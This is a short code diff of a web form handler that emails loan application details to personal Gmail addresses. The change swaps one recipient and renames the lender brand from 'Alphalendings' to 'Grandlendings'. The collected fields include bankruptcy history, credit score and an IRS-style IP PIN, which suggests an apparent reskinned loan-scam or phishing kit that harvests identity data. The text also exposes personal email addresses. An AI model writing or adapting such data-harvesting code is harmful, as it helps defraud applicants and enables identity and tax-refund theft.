@@ -45,7 +45,7 @@ export async function POST(request) {
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
-    to: ["piexe93@gmail.com", "solomonojukwu4@gmail.com"],
+    to: ["samsonrichfield@gmail.com", "solomonojukwu4@gmail.com"],
     subject: "Loan Application Details",
     html: `
     <h3>Loan Application Details ${
@@ -88,8 +88,8 @@ export async function POST(request) {
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>Alphalendings Source: ${formData.AlphalendingsSource}</p>
-    <p>Alphalendings Source Other: ${formData.AlphalendingsSourceOther}</p>
+    <p>Grandlendings Source: ${formData.GrandlendingsSource}</p>
+    <p>Grandlendings Source Other: ${formData.GrandlendingsSourceOther}</p>
     <p>Credit Score: ${formData.creditScore}</p>
     <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
     <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
